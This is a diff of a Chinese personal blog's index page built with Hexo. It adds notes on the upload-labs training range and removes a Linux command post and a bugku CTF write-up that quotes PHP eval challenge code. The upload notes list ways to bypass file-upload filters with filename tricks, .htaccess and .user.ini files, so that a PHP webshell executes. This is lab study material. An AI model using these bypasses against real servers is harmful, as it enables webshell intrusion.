+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-uploadlabs" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/29/uploadlabs/">uploadlabs</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/09/29/uploadlabs/" class="archive-article-date">
+  	<time datetime="2021-09-29T10:53:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-29</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44426869/article/details/104236854">https://blog.csdn.net/weixin_44426869/article/details/104236854</a><br>检测方法：<br>1.前端检测：一般用js。绕过方法：1.禁用js。2.直接改数据包<br>2.type检测：检测的是数据包中<code>Content-Type</code>的部分，是前端根据文件类型生成数据包时加的部分，并不会影响程序所以没什么用。绕过：在发包之前改成需要的就行。<br>3.文件后缀检测：获取文件名之后，通过字符串截取的方法来获取后缀来判断。<br>截取一般包含以下几部分：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); &#x2F;&#x2F;收尾去空和部分不合法字符 &#x2F;&#x2F;(1)</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点 &#x2F;&#x2F;(2)</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); &#x2F;&#x2F;截取包括点以后的字符串()</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写 &#x2F;&#x2F;(3)</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA &#x2F;&#x2F;(4)</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空 &#x2F;&#x2F;(5)</span><br></pre></td></tr></table></figure>
+<pre><code>可以根据缺少哪一部分来判断怎么改：
+(1)在后面添空格
+(2)在文件名后面加点，在服务端再次生成文件的时候会自动删去
+(3)大小写绕过，随便改后缀的大小写
+    （大小写绕过原理：Windows系统下，对于文件名中的大小写不敏感。例如：test.php和TeSt.PHP是一样的。Linux系统下，对于文件名中的大小写敏感。例如：test.php和 TesT.php就是不一样的。）（还是那句话，前提是要开启这个功能，反正phpstudy没开）
+(4)方法1：```::$DATA```绕过：直接在文件名后面加```::$DATA```(注意：连接木马的时候不要把```::$DATA```复制到网址)
+   方法2：所有```str_ireplace()```函数都可以“双鞋绕过”，比如检查的是```::$DATA```，那就可以```::$D::$DATAATA```，如果检查的是```php```，那就可以```phphpp```
+(5)意义不明，不知道怎么绕
+(6)补充：原文件的后缀不是目的，让文件在服务器上的文件后缀可识别才是目的。比如Pass-10中，文件名是去除末尾的点之后的状态，所以可以用两点绕过：```hack.php. .```
+</code></pre>
+<p>一般用于对照的文件后缀有以下这些：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.user.ini&quot;</span><br></pre></td></tr></table></figure>
+<pre><code>可以根据缺少的过滤后缀来确定绕过方法
+(1) &quot;.php&quot;=&quot;.php5&quot;=&quot;.php4&quot;=&quot;.php3&quot;=&quot;.php2&quot;(前提：开)
+(2) .htaccess:
+    创建```1.htaccess```，并将其上传：
+    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;上传的图片马的文件名&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+    再上传图片马即可。(前提：开)
+    补充：htaccess文件介绍：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。
+    其中.htaccess文件内容：
+    SetHandler application/x-httpd-php
+    设置当前目录所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当作PHP执行。不符合则报错。
+(3) .user.ini:
+    这个题目的前提是，上传目录内本来就有一个php文件，假设文件名为：```readme.php```
+    先上传一个以auto_prepend_file=1.gif为内容的.user.ini文件，然后再上传一个内容为php的一句话的脚本，命名为1.gif，.user.ini文件里面的意思是：所有的php文件都自动包含1.gif文件。.user.ini相当于一个用户自定义的php.ini。
+    然后访问```readme.php```就可以了
+    (另：首先很多的php不一定支持自己写ini，其次有些老版的服务器不一定支持实时检测.user.ini所以实际操作不是很现实)
+</code></pre>
+<p>刷到：Pass-12</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/09/29/uploadlabs/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
     <article id="post-uploadlabs-4" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1137,348 +1426,9 @@
     </section>
   
   
-    <article id="post-linux笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/19/linux%E7%AC%94%E8%AE%B0/">linux笔记</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/19/linux%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2021-08-19T02:36:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-19</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>参考网页：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg2NTAzMTExNg==&amp;mid=2247483879&amp;idx=1&amp;sn=96181b566c35679e48db6bd26fb59a2c&amp;chksm=ce610744f9168e5254c0fec44d82a6d84d042e4f8febceb02f200d48e157724d2fa14d1a6498&amp;mpshare=1&amp;scene=23&amp;srcid=0804m6iIsc8cFN9vuvY1Q803&amp;sharer_sharetime=1628081308664&amp;sharer_shareid=c1177fe8f27bdd4322b62191a6954e71#rd">https://mp.weixin.qq.com/s?__biz=Mzg2NTAzMTExNg==&amp;mid=2247483879&amp;idx=1&amp;sn=96181b566c35679e48db6bd26fb59a2c&amp;chksm=ce610744f9168e5254c0fec44d82a6d84d042e4f8febceb02f200d48e157724d2fa14d1a6498&amp;mpshare=1&amp;scene=23&amp;srcid=0804m6iIsc8cFN9vuvY1Q803&amp;sharer_sharetime=1628081308664&amp;sharer_shareid=c1177fe8f27bdd4322b62191a6954e71#rd</a></p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/4dZ3mbu287pC6mdGOczGAA">https://mp.weixin.qq.com/s/4dZ3mbu287pC6mdGOczGAA</a></p>
-<p>解压：tar -zxvf (包名)<br>新建文件夹：mkdir (文件名)<br>ls：-ll(查看详细信息)<br>-al（查看全部文件，包括隐藏文件）<br>ls / :查看根目录</p>
-<p>linux中，没有错误（包括没有回显）就是成功的（linux中没有错误就是成功）</p>
-<p>以下是对这些目录的解释：<br>*<br>/bin：bin是Binary的缩写, 这个目录存放着最经常使用的命令。</p>
-<p>/boot： 这里存放的是启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件。</p>
-<p>/dev ： dev是Device(设备)的缩写, 存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。<br>*<br>/etc： 这个目录用来存放所有的系统管理所需要的配置文件和子目录。<br>*<br>/home：用户的主目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的。</p>
-<p>/lib：这个目录里存放着系统最基本的动态连接共享库，其作用类似于Windows里的DLL文件。<br>*<br>/lost+found：这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。(存放突然关机的文件)</p>
-<p>/media：linux系统会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会把识别的设备挂载到这个目录下。</p>
-<p>/mnt：系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在/mnt/上，然后进入该目录就可以查看光驱里的内容了。<br>*<br>/opt：这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。</p>
-<p>/proc：这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。<br>*<br>/root：该目录为系统管理员，也称作超级权限者的用户主目录。</p>
-<p>/sbin：s就是Super User的意思，这里存放的是系统管理员使用的系统管理程序。</p>
-<p>/srv：该目录存放一些服务启动之后需要提取的数据。</p>
-<p>/sys：这是linux2.6内核的一个很大的变化。该目录下安装了2.6内核中新出现的一个文件系统 sysfs 。</p>
-<p>/tmp：这个目录是用来存放一些临时文件的。<br>*<br>/usr：这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。</p>
-<p>/usr/bin： 系统用户使用的应用程序。</p>
-<p>/usr/sbin： 超级用户使用的比较高级的管理程序和系统守护程序。</p>
-<p>/usr/src： 内核源代码默认的放置目录。<br>*<br>/var：这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。</p>
-<p>/run：是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。<br>*<br>/www: 与服务器相关的资源</p>
-<p>绝对路径：</p>
-<p>路径的写法，由根目录 / 写起，例如：/usr/share/doc 这个目录。</p>
-<p>相对路径：</p>
-<p>路径的写法，不是由 / 写起，例如由 /usr/share/doc 要到 /usr/share/man 底下时，可以写成：cd ../man 这就是相对路径的写法啦！</p>
-<p>几个常见的处理目录的命令吧：</p>
-<p>ls: 列出目录</p>
-<p>cd：切换目录</p>
-<p>pwd：显示目前的目录（可以看到绝对路径，用来确定位置）</p>
-<p>mkdir：创建一个新的目录</p>
-<p>rmdir：删除一个空的目录</p>
-<p>cp: 复制文件或目录</p>
-<p>rm: 移除文件或目录</p>
-<p>mv: 移动文件与目录，或修改文件与目录的名称</p>
-<p>你可以使用 man [命令] 来查看各个命令的使用文档，如 ：man cp。</p>
-<hr>
-<h2 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h2><p>选项与参数：</p>
-<p>-a ：全部的文件，连同隐藏文件( 开头为 . 的文件) 一起列出来(常用)</p>
-<p>-l ：长数据串列出，包含文件的属性与权限等等数据；(常用)<br>(合起来：-al）</p>
-<hr>
-<h2 id="pwd-显示目前所在的目录"><a href="#pwd-显示目前所在的目录" class="headerlink" title="pwd ( 显示目前所在的目录 )"></a>pwd ( 显示目前所在的目录 )</h2><p>pwd 是 Print Working Directory 的缩写，也就是显示目前所在目录的命令。</p>
-<p>[root@kuangshen kuangstudy]#pwd [-P]<br>选项与参数：-P ：显示出确实的路径，而非使用连接(link) 路径。</p>
-<p>mkdir （创建新目录）</p>
-<p>如果想要创建新的目录的话，那么就使用mkdir (make directory)吧。</p>
-<hr>
-<h2 id="mkdir-mp-目录名称"><a href="#mkdir-mp-目录名称" class="headerlink" title="mkdir [-mp] 目录名称"></a>mkdir [-mp] 目录名称</h2><p>选项与参数：</p>
-<p>-m ：配置文件的权限喔！直接配置，不需要看默认权限 (umask) 的脸色～</p>
-<p>-p ：帮助你直接将所需要的目录(包含上一级目录)递归创建起来！</p>
-<hr>
-<h2 id="rmdir-删除空的目录"><a href="#rmdir-删除空的目录" class="headerlink" title="rmdir ( 删除空的目录 )"></a>rmdir ( 删除空的目录 )</h2><p>语法：</p>
-<p>rmdir [-p] 目录名称<br>选项与参数：-p ：连同上一级『空的』目录也一起删除</p>
-<hr>
-<h2 id="cp-复制文件或目录"><a href="#cp-复制文件或目录" class="headerlink" title="cp ( 复制文件或目录 )"></a>cp ( 复制文件或目录 )</h2><p>语法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@www ~]# cp [-adfilprsu] 来源档(source) 目标档(destination)</span><br><span class="line">[root@www ~]# cp [options] source1 source2 source3 .... directory</span><br></pre></td></tr></table></figure>
-<p>选项与参数：</p>
-<p>-a：相当於 -pdr 的意思，至於 pdr 请参考下列说明；(常用)</p>
-<p>-p：连同文件的属性一起复制过去，而非使用默认属性(备份常用)；</p>
-<p>-d：若来源档为连结档的属性(link file)，则复制连结档属性而非文件本身；</p>
-<p>-r：递归持续复制，用於目录的复制行为；(常用)</p>
-<p>-f：为强制(force)的意思，若目标文件已经存在且无法开启，则移除后再尝试一次；</p>
-<p>-i：若目标档(destination)已经存在时，在覆盖时会先询问动作的进行(常用)</p>
-<p>-l：进行硬式连结(hard link)的连结档创建，而非复制文件本身。</p>
-<p>-s：复制成为符号连结档 (symbolic link)，亦即『捷径』文件；</p>
-<p>-u：若 destination 比 source 旧才升级 destination ！</p>
-<p>rm ( 移除文件或目录 )</p>
-<h2 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h2><h2 id="rm-fir-文件或目录"><a href="#rm-fir-文件或目录" class="headerlink" title="rm [-fir] 文件或目录"></a>rm [-fir] 文件或目录</h2><p>选项与参数：</p>
-<p>-f ：就是 force 的意思，忽略不存在的文件，不会出现警告信息；</p>
-<p>-i ：互动模式，在删除前会询问使用者是否动作</p>
-<p>-r ：递归删除啊！最常用在目录的删除了！这是非常危险的选项！！！</p>
-<h1 id="尽量不要在服务器上使用-rm-rf-（俗称“删库跑路”）"><a href="#尽量不要在服务器上使用-rm-rf-（俗称“删库跑路”）" class="headerlink" title="尽量不要在服务器上使用 rm -rf /   （俗称“删库跑路”）"></a>尽量不要在服务器上使用 rm -rf /   （俗称“删库跑路”）</h1><hr>
-<h2 id="mv-移动文件与目录，或修改名称"><a href="#mv-移动文件与目录，或修改名称" class="headerlink" title="mv  ( 移动文件与目录，或修改名称 )"></a>mv  ( 移动文件与目录，或修改名称 )</h2><p>语法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@www ~]# mv [-fiu] source destination</span><br><span class="line">[root@www ~]# mv [options] source1 source2 source3 .... directory</span><br></pre></td></tr></table></figure>
-<p>选项与参数：</p>
-<p>-f ：force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖；</p>
-<p>-i ：若目标文件 (destination) 已经存在时，就会询问是否覆盖！</p>
-<p>-u ：若目标文件已经存在，且 source 比较新，才会升级 (update)</p>
-<hr>
-<h2 id="使用ll或者ls-–l命令来显示一个文件的属性以及文件所属的用户和组"><a href="#使用ll或者ls-–l命令来显示一个文件的属性以及文件所属的用户和组" class="headerlink" title="使用ll或者ls –l命令来显示一个文件的属性以及文件所属的用户和组"></a>使用ll或者ls –l命令来显示一个文件的属性以及文件所属的用户和组</h2><p>在Linux中第一个字符代表这个文件是目录、文件或链接文件等等：</p>
-<p>当为[ d ]则是目录</p>
-<p>当为[ - ]则是文件；</p>
-<p>若是[ l ]则表示为链接文档 ( link file )；</p>
-<p>若是[ b ]则表示为装置文件里面的可供储存的接口设备 ( 可随机存取装置 )；</p>
-<p>若是[ c ]则表示为装置文件里面的串行端口设备，例如键盘、鼠标 ( 一次性读取装置 )。</p>
-<p>接下来的字符中，以三个为一组，且均为『rwx』 的三个参数的组合。</p>
-<p>其中，[ r ]代表可读(read)、[ w ]代表可写(write)、[ x ]代表可执行(execute)。</p>
-<p>要注意的是，这三个权限的位置不会改变，如果没有权限，就会出现减号[ - ]而已。</p>
-<p>修改文件属性</p>
-<p>1、chgrp：更改文件属组</p>
-<p>chgrp [-R] 属组名 文件名<br>-R：递归更改文件属组，就是在更改某个目录文件的属组时，如果加上-R的参数，那么该目录下的所有文件的属组都会更改。</p>
-<p>2、chown：更改文件属主，也可以同时更改文件属组</p>
-<p>chown [–R] 属主名 文件名<br>chown [-R] 属主名：属组名 文件名<br>3、chmod：更改文件9个属性</p>
-<p>chmod [-R] xyz 文件或目录<br>Linux文件属性有两种设置方法，一种是数字，一种是符号。</p>
-<p>Linux文件的基本权限就有九个，分别是owner/group/others三种身份各有自己的read/write/execute权限。</p>
-<p>先复习一下刚刚上面提到的数据：文件的权限字符为：『-rwxrwxrwx』， 这九个权限是三个三个一组的！其中，我们可以使用数字来代表各个权限，各权限的分数对照表如下：</p>
-<p>r:4     w:2         x:1<br>每种身份(owner/group/others)各自的三个权限(r/w/x)分数是需要累加的，例如当权限为：[-rwxrwx—] 分数则是：</p>
-<p>owner = rwx = 4+2+1 = 7</p>
-<p>group = rwx = 4+2+1 = 7</p>
-<p>others= — = 0+0+0 = 0</p>
-<p>chmod 770 filename<br>可以自己下去多进行测试！</p>
-<hr>
-<h2 id="文件内容查看（都可以用来打开文件）"><a href="#文件内容查看（都可以用来打开文件）" class="headerlink" title="文件内容查看（都可以用来打开文件）"></a>文件内容查看（都可以用来打开文件）</h2><p>概述</p>
-<p>Linux系统中使用以下命令来查看文件的内容：</p>
-<p>cat 由第一行开始显示文件内容</p>
-<p>tac 从最后一行开始显示，可以看出 tac 是 cat 的倒着写！</p>
-<p>nl  显示的时候，顺道输出行号！</p>
-<p>more 一页一页的显示文件内容</p>
-<p>less 与 more 类似，但是比 more 更好的是，他可以往前翻页！</p>
-<p>head 只看头几行</p>
-<p>tail 只看尾巴几行</p>
-<h2 id="你可以使用-man-命令-来查看各个命令的使用文档，如-：man-cp。"><a href="#你可以使用-man-命令-来查看各个命令的使用文档，如-：man-cp。" class="headerlink" title="你可以使用 man [命令]来查看各个命令的使用文档，如 ：man cp。"></a>你可以使用 man [命令]来查看各个命令的使用文档，如 ：man cp。</h2><h2 id="cat-由第一行开始显示文件内容"><a href="#cat-由第一行开始显示文件内容" class="headerlink" title="cat 由第一行开始显示文件内容"></a>cat 由第一行开始显示文件内容</h2><p>语法：</p>
-<p>cat [-AbEnTv]<br>选项与参数：</p>
-<p>-A ：相当於 -vET 的整合选项，可列出一些特殊字符而不是空白而已；</p>
-<p>-b ：列出行号，仅针对非空白行做行号显示，空白行不标行号！</p>
-<p>-E ：将结尾的断行字节 $ 显示出来；</p>
-<p>-n ：列印出行号，连同空白行也会有行号，与 -b 的选项不同；</p>
-<p>-T ：将 [tab] 按键以 ^I 显示出来；</p>
-<p>-v ：列出一些看不出来的特殊字符</p>
-<hr>
-<h2 id="tac"><a href="#tac" class="headerlink" title="tac"></a>tac</h2><p>tac与cat命令刚好相反，文件内容从最后一行开始显示，可以看出 tac 是 cat 的倒着写</p>
-<hr>
-<h2 id="nl-显示行号"><a href="#nl-显示行号" class="headerlink" title="nl  显示行号"></a>nl  显示行号</h2><p>语法：</p>
-<p>nl [-bnw] 文件<br>选项与参数：</p>
-<p>-b ：指定行号指定的方式，主要有两种：-b a ：表示不论是否为空行，也同样列出行号(类似 cat -n)；-b t ：如果有空行，空的那一行不要列出行号(默认值)；</p>
-<p>-n ：列出行号表示的方法，主要有三种：-n ln ：行号在荧幕的最左方显示；-n rn ：行号在自己栏位的最右方显示，且不加 0 ；-n rz ：行号在自己栏位的最右方显示，且加 0 ；</p>
-<p>-w ：行号栏位的占用的位数。</p>
-<hr>
-<table>
-<thead>
-<tr>
-<th>：管道符</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>A</td>
-</tr>
-<tr>
-<td>grep：查找文件中符合条件的字符串（和管道符共用很好用）</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="确保Linux的防火墙端口是开启的，如果是阿里云，需要保证阿里云的安全组策略是开放的！"><a href="#确保Linux的防火墙端口是开启的，如果是阿里云，需要保证阿里云的安全组策略是开放的！" class="headerlink" title="确保Linux的防火墙端口是开启的，如果是阿里云，需要保证阿里云的安全组策略是开放的！"></a>确保Linux的防火墙端口是开启的，如果是阿里云，需要保证阿里云的安全组策略是开放的！</h2><h1 id="查看firewall服务状态"><a href="#查看firewall服务状态" class="headerlink" title="查看firewall服务状态"></a>查看firewall服务状态</h1><p>systemctl status firewalld</p>
-<h1 id="开启、重启、关闭、firewalld-service服务"><a href="#开启、重启、关闭、firewalld-service服务" class="headerlink" title="开启、重启、关闭、firewalld.service服务"></a>开启、重启、关闭、firewalld.service服务</h1><h1 id="开启"><a href="#开启" class="headerlink" title="开启"></a>开启</h1><p>service firewalld start</p>
-<h1 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h1><p>service firewalld restart</p>
-<h1 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h1><p>service firewalld stop</p>
-<h1 id="查看防火墙规则"><a href="#查看防火墙规则" class="headerlink" title="查看防火墙规则"></a>查看防火墙规则</h1><p>firewall-cmd –list-all    # 查看全部信息<br>firewall-cmd –list-ports  # 只看端口信息</p>
-<h1 id="开启端口"><a href="#开启端口" class="headerlink" title="开启端口"></a>开启端口</h1><p>开端口命令：firewall-cmd –zone=public –add-port=80/tcp –permanent<br>重启防火墙：systemctl restart firewalld.service</p>
-<p>命令含义：<br>–zone #作用域<br>–add-port=80/tcp  #添加端口，格式为：端口/通讯协议<br>–permanent   #永久生效，没有此参数重启后失效</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/19/linux%E7%AC%94%E8%AE%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-闪电十六鞭" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/12/bugku-web-%E9%97%AA%E7%94%B5%E5%8D%81%E5%85%AD%E9%9E%AD/">bugku-web-闪电十六鞭</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/12/bugku-web-%E9%97%AA%E7%94%B5%E5%8D%81%E5%85%AD%E9%9E%AD/" class="archive-article-date">
-  	<time datetime="2021-08-12T06:00:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>参考这篇——<a target="_blank" rel="noopener" href="https://www.cnblogs.com/fallingskies/p/14287103.html">https://www.cnblogs.com/fallingskies/p/14287103.html</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&#39;&#x2F;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">    $exam &#x3D; &#39;return\&#39;&#39;.sha1(time()).&#39;\&#39;;&#39;;</span><br><span class="line"></span><br><span class="line">    if (!isset($_GET[&#39;flag&#39;])) &#123;</span><br><span class="line">        echo &#39;&lt;a href&#x3D;&quot;.&#x2F;?flag&#x3D;&#39;.$exam.&#39;&quot;&gt;Click here&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (strlen($_GET[&#39;flag&#39;]) !&#x3D; strlen($exam)) &#123;</span><br><span class="line">        echo &#39;长度不允许&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (preg_match(&#39;&#x2F;&#96;|&quot;|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit&#x2F;is&#39;, $_GET[&#39;flag&#39;])) &#123;</span><br><span class="line">        echo &#39;关键字不允许&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (eval($_GET[&#39;flag&#39;]) &#x3D;&#x3D;&#x3D; sha1($flag)) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &#39;马老师发生甚么事了&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
-<p>当没有用GET方法传入flag时，会显示Click here的链接。</p>
-<p>点击链接会用GET方法传入一串字符串$exam，后面是当前时间的一串sha1哈希值。</p>
-<p>判断传入的flag长度与$exam是否相同，不同则显示  长度不允许</p>
-<p>第二个判断过滤了一大堆</p>
-<p>第三个判断传入flag的值等于flag值的哈希值，正确就输出flag。用的是严格的三个等号的比较，我们flag都不知道，哈希值更不可能知道了，==</p>
